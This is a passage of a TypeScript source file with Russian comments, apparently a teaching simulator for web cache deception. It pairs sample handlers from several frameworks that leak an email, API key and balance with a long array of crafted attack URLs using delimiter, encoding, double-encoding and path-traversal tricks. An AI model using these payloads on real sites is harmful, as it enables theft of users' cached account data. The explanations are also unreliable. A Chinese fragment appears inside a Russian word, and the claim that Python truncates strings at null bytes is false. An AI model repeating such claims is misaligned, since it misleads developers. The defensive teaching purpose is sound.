//    /account/home%00.css
//    → Зависит от сервера:
//      Tomcat: обрезает по null-байту → /account/home → СОВПАДАЕТ!
//      Undertow: может вернуть 400 (плохой запрос)
//
// Вывод: ; и %00 — самые опасные разделители для Spring Boot`,

  ruby: `# ═══════════════════════════════════════════════════════
# app.rb — Ruby on Rails сервер
# ═══════════════════════════════════════════════════════
#
# Что это: Ruby on Rails (или просто Rails) — это фреймворк
#          для создания веб-приложений на языке Ruby.
#          Он автоматически обрабатывает маршрутизацию,
#          базу данных и отображение страниц.
#
# Особенность Rails: точка в URL означает формат ответа
#   /account/home    → формат по умолчанию (HTML)
#   /account/home.json → формат JSON
#   /account/home.css  → формат CSS (если есть шаблон)
# ═══════════════════════════════════════════════════════

# ── Маршруты (routes) ──
# Маршрут — это правило: какой URL → какой обработчик
Rails.application.routes.draw do
  get '/account/home', to: 'accounts#home'   # /account/home → AccountsController.home
  get '/profile', to: 'profiles#show'         # /profile → ProfilesController.show
end

# ── Контроллер — обработчик запроса ──
# before_action — фильтр: выполнить ДО обработки запроса
# authenticate_user! — проверяет, что пользователь залогинен
class AccountsController < ApplicationController
  before_action :authenticate_user!  # Если не залогинен → редирект на логин

  def home                           # Обработчик маршрута /account/home
    render json: {                   # Вернуть данные как JSON
      username: current_user.email,  # Email текущего пользователя
      api_key: current_user.api_key, # Его секретный API-ключ
      balance: current_user.balance  # Баланс аккаунта
    }
    # ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
    # ↑ Rails по умолчанию НЕ добавляет этот заголовок
    # ↑ Кэш-сервер может сохранить ответ
    #
    # КАК ИСПРАВИТЬ:
    #   response.headers['Cache-Control'] = 'no-store'
    #   render json: {...}
  end
end

# ═══ Как Rails обрабатывает спецсимволы ═══
# Rails работает поверх Rack — прослойки между сервером и приложением
#
# 1. Точка в URL = формат ответа:
#    /account/home.css
#    → Rails видит .css → пытается найти CSS-шаблон
#    → Если шаблона нет → 406 Not Acceptable
#    → Если шаблон есть → вернёт CSS (не данные!)
#
# 2. Перевод строки (%0a):
#    /account/home%0a.css
#    → Зависит от Rack middleware
#    → Rack МОЖЕТ обрезать путь по переводу строки
#    → Тогда: /account/home → маршрут СОВПАДАЕТ → профиль!
#    → Но прокси видит .css → кэширует!
#
# 3. Точка с запятой (;):
#    → Rails может интерпретировать как часть пути
#    → Зависит от версии и настроек
#
# Вывод: Rails уязвим через %0a, если Rack обрезает путь`,

  django: `# ═══════════════════════════════════════════════════════
# views.py — Python + Django сервер
# ═══════════════════════════════════════════════════════
#
# Что это: Django — полноценный веб-фреймворк для Python.
#          Встроенная система маршрутизации URL, ORM,
#          middleware, шаблоны — всё включено.
#
# Как работает маршрутизация:
#   path('url/', view_function) — точное совпадение
#   re_path(r'^url/', view) — регулярное выражение
#   Django ищет ПЕРВОЕ совпадение в urls.py
# ═══════════════════════════════════════════════════════

from django.http import JsonResponse
from django.contrib.auth.decorators import login_required

# ── Защищённый маршрут — профиль пользователя ──
@login_required                    # Только для залогиненных!
def account_home(request):         # request — объект HTTP-запроса
    user = request.user            # Текущий пользователь (из сессии)
    return JsonResponse({          # Вернуть как JSON-ответ
        'username': user.email,    # Email пользователя
        'api_key': user.api_key,   # Секретный API-ключ
        'balance': user.balance,   # Баланс аккаунта
    })
    # ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
    # ↑ Django НЕ добавляет его по умолчанию
    #
    # КАК ИСПРАВИТЬ:
    #   from django.views.decorators.cache import never_cache
    #   @never_cache  ← Добавит Cache-Control: no-store
    #   def account_home(request):
    #       ...

# ═══ Как Django обрабатывает спецсимволы в URL ═══
# Django декодирует URL через urllib.parse.unquote.
# Но Django ищет ТОЧНОЕ совпадение маршрута:
#   Маршрут: /account/home
#   URL /account/home%0f.css → декодируется → /account/home\\x0f.css
#   → НЕ совпадает с /account/home → 404!
#
# НО: если использовать catch-all или re_path:
#   re_path(r'^account/(.*)$', account_view)
#   → /account/home%0f.css СОВПАДЁТ → уязвимость!
#
# Null-байт (%00):
#   /account/home%00.css
#   → Python обрезает по null-байту: /account/home
#   → Маршрут СОВПАДАЕТ → возвращает профиль!
#   → Прокси видит .css → кэширует!
#
# Вывод: Django безопаснее Flask, но %00 — опасен`,

  laravel: `// ═══════════════════════════════════════════════════════
// AccountController.php — PHP + Laravel сервер
// ═══════════════════════════════════════════════════════
//
// Что это: Laravel — самый популярный PHP-фреймворк.
//          Использует Symfony Routing Component для
//          обработки URL.
//
// Как работает маршрутизация:
//   Route::get('/url', [Controller::class, 'method'])
//   Laravel ищет точное совпадение маршрута.
// ═══════════════════════════════════════════════════════

use Illuminate\\Http\\Request;
use App\\Http\\Controllers\\Controller;

class AccountController extends Controller
{
    // ── Защищённый маршрут — профиль пользователя ──
    // middleware('auth') — проверяет, что пользователь залогинен
    public function __construct()
    {
        $this->middleware('auth');  // Все методы — только для залогиненных
    }

    public function home()
    {
        $user = auth()->user();    // Текущий пользователь (из сессии)
        return response()->json([  // Вернуть как JSON-ответ
            'username' => $user->email,     // Email
            'api_key'  => $user->api_key,   // Секретный API-ключ
            'balance'  => $user->balance,   // Баланс
        ]);
        // ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
        // ↑ Laravel НЕ добавляет его по умолчанию
        //
        // КАК ИСПРАВИТЬ:
        //   return response()->json([...])
        //       ->header('Cache-Control', 'no-store');
    }
}

// ═══ Как Laravel обрабатывает спецсимволы в URL ═══
// PHP обрезает строки по null-байту (унаследовано от C):
//   /account/home%00.css → обрезает → /account/home
//   → Маршрут СОВПАДАЕТ → возвращает профиль!
//   → Прокси видит .css → кэширует!
//
// %0a (перевод строки):
//   /account/home%0a.css
//   → Зависит от PHP-версии и настроек
//   → PHP 8+ более строг к спецсимволам
//
// Точка в URL:
//   /account/home.css
//   → Laravel ищет точное совпадение маршрута
//   → /account/home.css НЕ совпадает с /account/home → 404
//
// Вывод: Laravel уязвим через %00, как и другие PHP-приложения`,

  go: `// ═══════════════════════════════════════════════════════
// main.go — Go (net/http) сервер
// ═══════════════════════════════════════════════════════
//
// Что это: Go имеет встроенный HTTP-сервер в стандартной
//          библиотеке net/http. Не нужен фреймворк!
//
// Как работает маршрутизация:
//   http.HandleFunc("/path", handler)
//   ServeMux ищет точное совпадение или最长ный префикс.
// ═══════════════════════════════════════════════════════

package main

import (
    "encoding/json"
    "net/http"
)

// ── Защищённый маршрут — профиль пользователя ──
func accountHome(w http.ResponseWriter, r *http.Request) {
    // Проверка авторизации через middleware
    user := getUserFromSession(r)  // Извлечь из cookie
    if user == nil {
        http.Error(w, "Unauthorized", 401)
        return
    }

    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]string{
        "username": user.Email,     // Email пользователя
        "api_key":  user.APIKey,    // Секретный API-ключ
        "balance":  user.Balance,   // Баланс аккаунта
    })
    // ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
    // ↑ net/http НЕ добавляет его автоматически
    //
    // КАК ИСПРАВИТЬ:
    //   w.Header().Set("Cache-Control", "no-store")
    //   ДО вызова json.NewEncoder
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/account/home", accountHome)
    http.ListenAndServe(":8080", mux)
}

// ═══ Как Go обрабатывает спецсимволы в URL ═══
// Go СТРОГО парсит URL через net/url:
//   /account/home%0f.css
//   → Декодирует %0f, но ServeMux ищет ТОЧНОЕ совпадение
//   → /account/home\\x0f.css НЕ совпадает с /account/home
//   → 404! Атака НЕ срабатывает!
//
// Null-байт (%00):
//   → Go НЕ обрезает строки по null-байту
//   → ServeMux: /account/home%00.css ≠ /account/home
//   → 404! Атака НЕ срабатывает!
//
// Вывод: Go — один из САМЫХ безопасных фреймворков
//        благодаря строгому роутингу и парсингу URL`,

  dotnet: `// ═══════════════════════════════════════════════════════
// AccountController.cs — ASP.NET Core сервер
// ═══════════════════════════════════════════════════════
//
// Что это: ASP.NET Core — фреймворк от Microsoft для
//          платформы .NET. Встроенный dependency injection,
//          строгий роутинг, middleware pipeline.
//
// Как работает маршрутизация:
//   [Route("api/[controller]")] — атрибут маршрута
//   [HttpGet("path")] — обработчик GET-запроса
// ═══════════════════════════════════════════════════════

using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

[ApiController]
[Route("account")]
[Authorize]   // Только для залогиненных!
public class AccountController : ControllerBase
{
    // ── Защищённый маршрут — профиль пользователя ──
    [HttpGet("home")]   // GET /account/home
    public IActionResult Home()
    {
        var user = GetUser();  // Из Claims (JWT/cookie)
        return Json(new
        {
            username = user.Email,    // Email
            api_key = user.ApiKey,    // Секретный API-ключ
            balance = user.Balance    // Баланс
        });
        // ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
        // ↑ ASP.NET Core НЕ добавляет автоматически
        //
        // КАК ИСПРАВИТЬ:
        //   Response.Headers["Cache-Control"] = "no-store";
    }
}

// ═══ Как ASP.NET Core обрабатывает спецсимволы ═══
// Null-байт (%00):
//   /account/home%00.css
//   → ASP.NET ОТКЛОНЯЕТ null-байты → 400 Bad Request!
//   → Атака НЕ срабатывает!
//
// Точка с запятой (;):
//   /account/home;.css
//   → ASP.NET НЕ обрезает по ; (в отличие от Spring)
//   → /account/home;.css НЕ совпадает с /account/home
//   → 404! Атака НЕ срабатывает!
//
// %0f:
//   → Строгий роутинг: /account/home%0f.css ≠ /account/home
//   → 404! Атака НЕ срабатывает!
//
// Вывод: ASP.NET Core — один из САМЫХ безопасных фреймворков
//        благодаря строгому роутингу и отклонению спецсимволов`,
}

const ATTACK_VARIANTS: AttackVariant[] = [
  // ── basic (6) ──────────────────────────────────────────
  { url: '/account/home', label: 'Обычный /account/home', category: 'basic', delimiter: '—', extension: '—', route: '/account/home', description: 'Стандартный запрос к аккаунту без разделителей и расширений. Не представляет угрозы.', severity: 'safe' },
  { url: '/api/user', label: 'Обычный /api/user', category: 'basic', delimiter: '—', extension: '—', route: '/api/user', description: 'Стандартный API-запрос данных пользователя. Безопасный запрос.', severity: 'safe' },
  { url: '/profile', label: 'Обычный /profile', category: 'basic', delimiter: '—', extension: '—', route: '/profile', description: 'Стандартный запрос профиля. Не вызывает расхождения.', severity: 'safe' },
  { url: '/dashboard', label: 'Обычный /dashboard', category: 'basic', delimiter: '—', extension: '—', route: '/dashboard', description: 'Стандартный запрос панели управления. Безопасный.', severity: 'safe' },
  { url: '/settings', label: 'Обычный /settings', category: 'basic', delimiter: '—', extension: '—', route: '/settings', description: 'Стандартный запрос настроек. Не вызывает кэширование.', severity: 'safe' },
  { url: '/account/home.css', label: '/account/home.css', category: 'basic', delimiter: '—', extension: 'css', route: '/account/home.css', description: 'Запрос с расширением .css, но маршрут не существует — вернёт 404.', severity: 'safe' },

  // ── delimiter (36) ─────────────────────────────────────
  { url: '/account/home%0f.css', label: '%0f + .css → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Невидимый символ Shift In между путём и расширением. Прокси видит .css, backend обрезает до маршрута.', severity: 'critical' },
  { url: '/account/home%0f.js', label: '%0f + .js → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/account/home', description: 'Разделитель %0f с расширением .js. Прокси кэширует как JavaScript-файл.', severity: 'critical' },
  { url: '/account/home%0f.png', label: '%0f + .png → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'png', route: '/account/home', description: 'Разделитель %0f с расширением .png. Прокси кэширует как изображение.', severity: 'critical' },
  { url: '/api/user%0f.css', label: '%0f + .css → /api/user', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/api/user', description: 'Разделитель %0f на API-маршруте. Кэш сохранит JSON-ответ как CSS.', severity: 'critical' },
  { url: '/api/user%0f.js', label: '%0f + .js → /api/user', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/api/user', description: 'Разделитель %0f с .js на API-маршруте. API-данные закэшированы как JS.', severity: 'critical' },
  { url: '/profile%0f.css', label: '%0f + .css → /profile', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/profile', description: 'Разделитель %0f на профиле. Конфиденциальные данные кэшируются как CSS.', severity: 'critical' },
  { url: '/profile%0f.js', label: '%0f + .js → /profile', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/profile', description: 'Разделитель %0f с .js на профиле. Данные профиля закэшированы.', severity: 'critical' },
  { url: '/dashboard%0f.css', label: '%0f + .css → /dashboard', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/dashboard', description: 'Разделитель %0f на панели управления. Кэш сохраняет данные как CSS.', severity: 'critical' },
  { url: '/settings%0f.css', label: '%0f + .css → /settings', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/settings', description: 'Разделитель %0f на настройках. Настройки пользователя закэшированы.', severity: 'critical' },
  { url: '/account/home%0a.css', label: '%0a + .css → /account/home', category: 'delimiter', delimiter: '%0a', extension: 'css', route: '/account/home', description: 'Символ перевода строки (%0a) между путём и расширением. Backend обрезает по \\n.', severity: 'critical' },
  { url: '/api/user%0a.js', label: '%0a + .js → /api/user', category: 'delimiter', delimiter: '%0a', extension: 'js', route: '/api/user', description: 'Перевод строки с .js. Многие backend-фреймворки обрезают путь по \\n.', severity: 'critical' },
  { url: '/profile%0a.css', label: '%0a + .css → /profile', category: 'delimiter', delimiter: '%0a', extension: 'css', route: '/profile', description: 'Перевод строки на профиле. Rack/Rails может обрезать путь по \\n.', severity: 'critical' },
  { url: '/dashboard%0a.png', label: '%0a + .png → /dashboard', category: 'delimiter', delimiter: '%0a', extension: 'png', route: '/dashboard', description: 'Перевод строки с .png. Кэш сохранит дашборд как изображение.', severity: 'critical' },
  { url: '/settings%0a.js', label: '%0a + .js → /settings', category: 'delimiter', delimiter: '%0a', extension: 'js', route: '/settings', description: 'Перевод строки с .js на настройках. Данные закэшированы как скрипт.', severity: 'critical' },
  { url: '/account/home%0d.css', label: '%0d + .css → /account/home', category: 'delimiter', delimiter: '%0d', extension: 'css', route: '/account/home', description: 'Возврат каретки (%0d). Некоторые фреймворки обрезают путь по \\r.', severity: 'critical' },
  { url: '/api/user%0d.js', label: '%0d + .js → /api/user', category: 'delimiter', delimiter: '%0d', extension: 'js', route: '/api/user', description: 'Возврат каретки с .js. Аналогично %0a, но реже распознаётся backend-ом.', severity: 'critical' },
  { url: '/profile%0d.css', label: '%0d + .css → /profile', category: 'delimiter', delimiter: '%0d', extension: 'css', route: '/profile', description: 'Возврат каретки на профиле. Может обходить нормализацию URL.', severity: 'critical' },
  { url: '/account/home%0d.js', label: '%0d + .js → /account/home', category: 'delimiter', delimiter: '%0d', extension: 'js', route: '/account/home', description: 'Возврат каретки с .js. Расхождение между кэшем и сервером.', severity: 'critical' },
  { url: '/account/home%00.css', label: '%00 + .css → /account/home', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/account/home', description: 'Null-байт — один из самых опасных разделителей. Многие языки обрезают строку по \\0.', severity: 'critical' },
  { url: '/api/user%00.js', label: '%00 + .js → /api/user', category: 'delimiter', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт с .js. C-основанные фреймворки обрезают путь по null.', severity: 'critical' },
  { url: '/profile%00.css', label: '%00 + .css → /profile', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/profile', description: 'Null-байт на профиле. Python, PHP, Ruby обрезают по \\0.', severity: 'critical' },
  { url: '/dashboard%00.png', label: '%00 + .png → /dashboard', category: 'delimiter', delimiter: '%00', extension: 'png', route: '/dashboard', description: 'Null-байт с .png. Дашборд закэширован как изображение.', severity: 'critical' },
  { url: '/settings%00.css', label: '%00 + .css → /settings', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/settings', description: 'Null-байт на настройках. Утечка конфиденциальных данных.', severity: 'critical' },
  { url: '/account/home;.css', label: '; + .css → /account/home', category: 'delimiter', delimiter: ';', extension: 'css', route: '/account/home', description: 'Точка с запятой — matrix-параметры в Spring/Java. Обрезается при маршрутизации.', severity: 'critical' },
  { url: '/api/user;.js', label: '; + .js → /api/user', category: 'delimiter', delimiter: ';', extension: 'js', route: '/api/user', description: 'Точка с запятой с .js. Spring MVC игнорирует matrix-параметры.', severity: 'critical' },
  { url: '/profile;.css', label: '; + .css → /profile', category: 'delimiter', delimiter: ';', extension: 'css', route: '/profile', description: 'Точка с запятой на профиле. Прокси видит .css и кэширует.', severity: 'critical' },
  { url: '/dashboard;.png', label: '; + .png → /dashboard', category: 'delimiter', delimiter: ';', extension: 'png', route: '/dashboard', description: 'Точка с запятой с .png. Дашборд закэширован через matrix-параметр.', severity: 'critical' },
  { url: '/account/home%1f.css', label: '%1f + .css → /account/home', category: 'delimiter', delimiter: '%1f', extension: 'css', route: '/account/home', description: 'Unit Separator (%1f). Управляющий символ, может обрезаться backend-ом.', severity: 'critical' },
  { url: '/account/home%0b.css', label: '%0b + .css → /account/home', category: 'delimiter', delimiter: '%0b', extension: 'css', route: '/account/home', description: 'Vertical Tab (%0b). Редкий разделитель, обрезается некоторыми парсерами URL.', severity: 'critical' },
  { url: '/account/home%0c.js', label: '%0c + .js → /account/home', category: 'delimiter', delimiter: '%0c', extension: 'js', route: '/account/home', description: 'Form Feed (%0c). Управляющий символ, может быть проигнорирован backend-ом.', severity: 'critical' },
  { url: '/api/user%09.css', label: '%09 + .css → /api/user', category: 'delimiter', delimiter: '%09', extension: 'css', route: '/api/user', description: 'Tab (%09). Некоторые парсеры URL обрезают путь по табуляции.', severity: 'critical' },
  { url: '/profile%23.css', label: '# + .css → /profile', category: 'delimiter', delimiter: '%23', extension: 'css', route: '/profile', description: 'Символ # (фрагмент). Может быть интерпретирован как начало якоря или разделитель.', severity: 'critical' },
  { url: '/dashboard%3F.png', label: '? + .png → /dashboard', category: 'delimiter', delimiter: '%3F', extension: 'png', route: '/dashboard', description: 'Символ ? (query-разделитель). Закодированный вопросительный знак в пути.', severity: 'critical' },
  { url: '/settings%0f.png', label: '%0f + .png → /settings', category: 'delimiter', delimiter: '%0f', extension: 'png', route: '/settings', description: 'Разделитель %0f с .png на настройках. Изображение с утечкой данных.', severity: 'critical' },
  { url: '/account/home%0f.svg', label: '%0f + .svg → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'svg', route: '/account/home', description: 'Разделитель %0f с SVG. Прокси кэширует как векторную графику.', severity: 'critical' },

  // ── encoding (12) ──────────────────────────────────────
  { url: '/account/home%uff0f.css', label: 'Unicode fullwidth / + .css', category: 'encoding', delimiter: '%uff0f', extension: 'css', route: '/account/home', description: 'Fullwidth слеш (U+FF0F). Некоторые серверы нормализуют Unicode-символы в ASCII.', severity: 'high' },
  { url: '/api/user%u002f.js', label: 'Unicode escape / + .js', category: 'encoding', delimiter: '%u002f', extension: 'js', route: '/api/user', description: 'Unicode-экранирование слеша. Может быть декодировано на стороне сервера.', severity: 'high' },
  { url: '/account/home%c0%af.css', label: 'Overlong UTF-8 / + .css', category: 'encoding', delimiter: '%c0%af', extension: 'css', route: '/account/home', description: 'Overlong кодировка слеша (2 байта вместо 1). Обходит простые фильтры WAF.', severity: 'high' },
  { url: '/profile%e0%80%af.js', label: 'Overlong UTF-8 / + .js', category: 'encoding', delimiter: '%e0%80%af', extension: 'js', route: '/profile', description: 'Трёхбайтовая overlong кодировка слеша. Редко проверяется фильтрами.', severity: 'high' },
  { url: '/dashboard%c0%ae.css', label: 'Overlong UTF-8 . + .css', category: 'encoding', delimiter: '%c0%ae', extension: 'css', route: '/dashboard', description: 'Overlong кодировка точки. Может обходить проверки расширений.', severity: 'high' },
  { url: '/account/home%5c.css', label: 'Обратный слеш + .css', category: 'encoding', delimiter: '%5c', extension: 'css', route: '/account/home', description: 'Обратный слеш вместо прямого. Windows-серверы могут нормализовать \\ в /.', severity: 'high' },
  { url: '/profile%e2%80%ae.css', label: 'RTL override + .css', category: 'encoding', delimiter: '%e2%80%ae', extension: 'css', route: '/profile', description: 'Right-To-Left Override (U+202E). Может изменить визуальное восприятие URL.', severity: 'medium' },
  { url: '/account/home%20.css', label: 'Пробел + .css', category: 'encoding', delimiter: '%20', extension: 'css', route: '/account/home', description: 'Закодированный пробел между путём и расширением. Может обрезаться backend-ом.', severity: 'high' },
  { url: '/dashboard%bb.css', label: '» + .css', category: 'encoding', delimiter: '%bb', extension: 'css', route: '/dashboard', description: 'Right double angle bracket. Нестандартный символ в пути URL.', severity: 'medium' },
  { url: '/api/user%b7.js', label: '· + .js', category: 'encoding', delimiter: '%b7', extension: 'js', route: '/api/user', description: 'Middle dot (·). Может интерпретироваться как разделитель на некоторых серверах.', severity: 'medium' },
  { url: '/settings%a0.css', label: 'NBSP + .css', category: 'encoding', delimiter: '%a0', extension: 'css', route: '/settings', description: 'Неразрывный пробел (non-breaking space). Парсеры могут обрезать по нему.', severity: 'high' },
  { url: '/account/home%2f%2e.css', label: 'Кодир. / и . + .css', category: 'encoding', delimiter: '%2f%2e', extension: 'css', route: '/account/home', description: 'Закодированные слеш и точка. Некоторые прокси не декодируют перед проверкой.', severity: 'high' },

  // ── path-manipulation (10) ─────────────────────────────
  { url: '/../account/home.css', label: '/../ + .css', category: 'path-manipulation', delimiter: '/../', extension: 'css', route: '/account/home', description: 'Обход пути с ../. Прокси может не нормализовать путь перед проверкой расширения.', severity: 'medium' },
  { url: '/account/./home%0f.css', label: './ + %0f + .css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Текущая директория (./) + разделитель %0f. Двойное искажение пути.', severity: 'medium' },
  { url: '//account/home.css', label: '// + .css', category: 'path-manipulation', delimiter: '//', extension: 'css', route: '/account/home', description: 'Двойной слеш в начале. Некоторые прокси обрабатывают // как /, но кэш-ключи различаются.', severity: 'medium' },
  { url: '/account/home/..%0f.css', label: '.. + %0f + .css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Path traversal с %0f. Комбинация ../ и разделителя для обхода фильтров.', severity: 'medium' },
  { url: '/./account/home.css', label: '/./ prefix + .css', category: 'path-manipulation', delimiter: '/./', extension: 'css', route: '/account/home', description: 'Префикс текущей директории. Нормализация может убрать ./, но кэш-ключ останется с ним.', severity: 'medium' },
  { url: '/account//home%0f.css', label: '// в пути + %0f.css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Двойной слеш внутри пути + разделитель. Несколько аномалий в одном URL.', severity: 'medium' },
  { url: '/account/home/.css', label: '/.css (точка-префикс)', category: 'path-manipulation', delimiter: '/', extension: 'css', route: '/account/home', description: 'Точка перед css без разделителя. Создаёт путь /home/.css — может совпасть с маршрутом.', severity: 'medium' },
  { url: '/..%252faccount/home.css', label: 'Двойное кодир. ../', category: 'path-manipulation', delimiter: '%252f', extension: 'css', route: '/account/home', description: 'Двойное кодирование path traversal. Первая декодировка даёт /../, вторая — обход.', severity: 'medium' },
  { url: '/account/home%2f.css', label: 'Закодир. слеш + .css', category: 'path-manipulation', delimiter: '%2f', extension: 'css', route: '/account/home', description: 'Закодированный слеш (%2f) перед .css. Прокси может не декодировать перед проверкой.', severity: 'medium' },
  { url: '/account/home%2e.css', label: 'Закодир. точка + .css', category: 'path-manipulation', delimiter: '%2e', extension: 'css', route: '/account/home', description: 'Закодированная точка (%2e). Прокси видит .css, но путь содержит %2e а не реальную точку.', severity: 'medium' },

  // ── double-encoding (10) ───────────────────────────────
  { url: '/account/home%250f.css', label: '%250f (2x %0f) + .css', category: 'double-encoding', delimiter: '%250f', extension: 'css', route: '/account/home', description: 'Двойное кодирование %0f. Первый decode даёт %0f, второй — управляющий символ.', severity: 'high' },
  { url: '/api/user%2500.js', label: '%2500 (2x %00) + .js', category: 'double-encoding', delimiter: '%2500', extension: 'js', route: '/api/user', description: 'Двойное кодирование null-байта. Обходит фильтры, декодирующие только один раз.', severity: 'high' },
  { url: '/profile%250a.css', label: '%250a (2x %0a) + .css', category: 'double-encoding', delimiter: '%250a', extension: 'css', route: '/profile', description: 'Двойное кодирование перевода строки. После первого decode — %0a, после второго — \\n.', severity: 'high' },
  { url: '/dashboard%250d.png', label: '%250d (2x %0d) + .png', category: 'double-encoding', delimiter: '%250d', extension: 'png', route: '/dashboard', description: 'Двойное кодирование возврата каретки. Обходит WAF и базовые фильтры.', severity: 'high' },
  { url: '/account/home%252f.css', label: '%252f (2x /) + .css', category: 'double-encoding', delimiter: '%252f', extension: 'css', route: '/account/home', description: 'Двойное кодирование слеша. Первый decode даёт %2f, второй — /. Создаёт вложенный путь.', severity: 'high' },
  { url: '/api/user%252e.js', label: '%252e (2x .) + .js', category: 'double-encoding', delimiter: '%252e', extension: 'js', route: '/api/user', description: 'Двойное кодирование точки. Может создать расширение файла после двойного декодирования.', severity: 'high' },
  { url: '/settings%250f.css', label: '%250f + .css → /settings', category: 'double-encoding', delimiter: '%250f', extension: 'css', route: '/settings', description: 'Двойное кодирование %0f на настройках. Настройки пользователя закэшированы.', severity: 'high' },
  { url: '/account/home%250a.js', label: '%250a + .js → /account/home', category: 'double-encoding', delimiter: '%250a', extension: 'js', route: '/account/home', description: 'Двойное кодирование %0a с .js. Аккаунт закэширован как JS-файл.', severity: 'high' },
  { url: '/profile%2500.png', label: '%2500 + .png → /profile', category: 'double-encoding', delimiter: '%2500', extension: 'png', route: '/profile', description: 'Двойное кодирование null + .png. Профиль закэширован как изображение.', severity: 'high' },
  { url: '/dashboard%252f.css', label: '%252f + .css → /dashboard', category: 'double-encoding', delimiter: '%252f', extension: 'css', route: '/dashboard', description: 'Двойное кодирование слеша на дашборде. Расхождение при двойном декодировании.', severity: 'high' },

  // ── extension-spoofing (8) ─────────────────────────────
  { url: '/account/home.css%00', label: '.css%00 на /account/home', category: 'extension-spoofing', delimiter: '%00', extension: 'css', route: '/account/home', description: 'Null-байт после расширения .css. Backend может обрезать по null, видя /account/home.css.', severity: 'high' },
  { url: '/api/user.js?v=1', label: '.js?v=1 на /api/user', category: 'extension-spoofing', delimiter: '?', extension: 'js', route: '/api/user', description: 'Query-параметр после расширения .js. Прокси кэширует, query влияет на ключ.', severity: 'low' },
  { url: '/profile.png%0f', label: '.png%0f на /profile', category: 'extension-spoofing', delimiter: '%0f', extension: 'png', route: '/profile', description: 'Разделитель после расширения .png. Прокси видит .png, backend обрезает %0f.', severity: 'medium' },
  { url: '/dashboard.css%0a', label: '.css%0a на /dashboard', category: 'extension-spoofing', delimiter: '%0a', extension: 'css', route: '/dashboard', description: 'Перевод строки после .css. Backend может обрезать путь по \\n.', severity: 'medium' },
  { url: '/account/home.css%0d', label: '.css%0d на /account/home', category: 'extension-spoofing', delimiter: '%0d', extension: 'css', route: '/account/home', description: 'Возврат каретки после .css. Расширение видимо для кэша, но backend обрезает.', severity: 'medium' },
  { url: '/settings.js#frag', label: '.js#frag на /settings', category: 'extension-spoofing', delimiter: '#', extension: 'js', route: '/settings', description: 'Фрагмент после .js. Браузер не отправляет #frag, но прокси может увидеть в полном URL.', severity: 'low' },
  { url: '/api/user.css%3b', label: '.css; на /api/user', category: 'extension-spoofing', delimiter: '%3b', extension: 'css', route: '/api/user', description: 'Точка с запятой после .css. Spring интерпретирует ; как matrix-параметр.', severity: 'medium' },
  { url: '/account/home.css%09', label: '.css%09 на /account/home', category: 'extension-spoofing', delimiter: '%09', extension: 'css', route: '/account/home', description: 'Tab после расширения .css. Backend может обрезать путь по табуляции.', severity: 'medium' },

  // ── query-based (8) ────────────────────────────────────
  { url: '/account/home?.css', label: '?.css на /account/home', category: 'query-based', delimiter: '?', extension: 'css', route: '/account/home', description: 'Query-строка начинается с .css. Прокси может проверить расширение в query.', severity: 'low' },
  { url: '/api/user?x=.css', label: '?x=.css на /api/user', category: 'query-based', delimiter: '?', extension: 'css', route: '/api/user', description: 'Параметр запроса содержит .css. Некоторые прокси кэшируют по расширению в query.', severity: 'low' },
  { url: '/profile?.js', label: '?.js на /profile', category: 'query-based', delimiter: '?', extension: 'js', route: '/profile', description: 'Query-строка с .js. Редко кэшируется, но возможно при ошибочной конфигурации.', severity: 'low' },
  { url: '/dashboard?x=.png', label: '?x=.png на /dashboard', category: 'query-based', delimiter: '?', extension: 'png', route: '/dashboard', description: 'Параметр с расширением .png. Кэш-ключ может включать query-строку.', severity: 'low' },
  { url: '/settings?.css&v=1', label: '?.css&v=1 на /settings', category: 'query-based', delimiter: '?', extension: 'css', route: '/settings', description: 'Query с .css и дополнительным параметром. Cache-busting может мешать.', severity: 'low' },
  { url: '/account/home?.css%0f', label: '?.css%0f на /account/home', category: 'query-based', delimiter: '?', extension: 'css', route: '/account/home', description: 'Query с расширением и разделителем. Комбинация query и delimiter техник.', severity: 'low' },
  { url: '/api/user?format=.js', label: '?format=.js на /api/user', category: 'query-based', delimiter: '?', extension: 'js', route: '/api/user', description: 'Параметр format с расширением. Некоторые фреймворки используют format для контента.', severity: 'low' },
  { url: '/profile?_.css', label: '?_.css на /profile', category: 'query-based', delimiter: '?', extension: 'css', route: '/profile', description: 'Подчёркивание с расширением .css в query. Техника cache-bust с расширением.', severity: 'low' },

  // ── advanced (12) ──────────────────────────────────────
  { url: '/account/home%0f.css?x=1', label: '%0f + .css + query', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Комбинация разделителя, расширения и query. Query может изменить ключ кэша.', severity: 'critical' },
  { url: '/api/user%00.js#frag', label: '%00 + .js + fragment', category: 'advanced', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт + .js + фрагмент. Тройная комбинация для обхода фильтров.', severity: 'critical' },
  { url: '/profile;matrix.css%0f', label: '; + .css + %0f', category: 'advanced', delimiter: ';', extension: 'css', route: '/profile', description: 'Matrix-параметр и разделитель %0f. Двойной разделитель в одном URL.', severity: 'critical' },
